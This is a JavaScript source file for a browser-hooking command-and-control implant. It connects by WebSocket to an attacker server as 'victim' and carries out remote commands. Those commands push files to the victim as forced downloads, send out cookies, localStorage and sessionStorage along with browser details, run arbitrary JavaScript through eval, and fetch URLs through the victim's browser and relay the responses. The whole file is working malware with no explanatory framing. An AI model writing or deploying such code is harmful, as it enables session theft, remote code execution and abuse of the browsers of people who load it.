const socket = new WebSocket("wss://SERVER-IP:8443/ws");

socket.onopen = () => {
  socket.send("victim");
  console.log("[+] WebSocket connected (victim)");
};

socket.onmessage = async (event) => {
  const data = event.data;

  // Handle file transfer
  if (data.startsWith("file:")) {
    const parts = data.split("|", 2);
    if (parts.length === 2) {
      const header = parts[0];
      const base64Data = parts[1];
      const filename = header.slice(5);
      const binary = atob(base64Data);
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      const blob = new Blob([bytes]);
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      console.log(`File "${filename}" received and downloaded.`);
      socket.send(`[FILE RECEIVED] ${filename} (${blob.size} bytes)`);
    }
    return;
  }

  // Handle browser info collection
  if (data.startsWith("collectinfo:")) {
    const fields = data.slice("collectinfo:".length).split(",");
    let results = {};
    if (fields.includes("useragent")) results.useragent = navigator.userAgent;
    if (fields.includes("platform")) results.platform = navigator.platform;
    if (fields.includes("urlref")) {
      results.url = window.location.href;
      results.referrer = document.referrer;
    }
    if (fields.includes("plugins")) {
      results.plugins = Array.from(navigator.plugins, p => p.name);
    }
    if (fields.includes("cookies")) results.cookies = document.cookie;
    if (fields.includes("storage")) {
      let localStorageData = {};
      let sessionStorageData = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
      }
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
      }
      results.localStorage = localStorageData;
      results.sessionStorage = sessionStorageData;
    }
    socket.send(`[COLLECTED INFO] ${JSON.stringify(results)}`);
    return;
  }

  // Handle custom JS execution
  if (data.startsWith("exec:")) {
    const jsCode = data.slice("exec:".length);
    try {
      const result = eval(jsCode);
      if (result !== undefined) {
        socket.send(`[✅ EXEC] ${jsCode.slice(0, 60)} → ${result}`);
      } else {
        socket.send(`[✅ EXEC] Executed: ${jsCode.slice(0, 60)}...`);
      }
    } catch (err) {
      socket.send(`[❌ EXEC ERROR] ${err}`);
    }
    return;
  }

  // Handle URL fetch
  try {
    const res = await fetch(data);
    if (res.status >= 200 && res.status < 500) {
      const text = await res.text();
      socket.send(`[✅] ${data} → ${res.status}`);
      socket.send(`[📄] Body Preview:\n${text.slice(0, 1000)}\n---`);
    }
  } catch (err) {
    socket.send(`[❌] Fetch error for ${data}: ${err}`);
  }
};
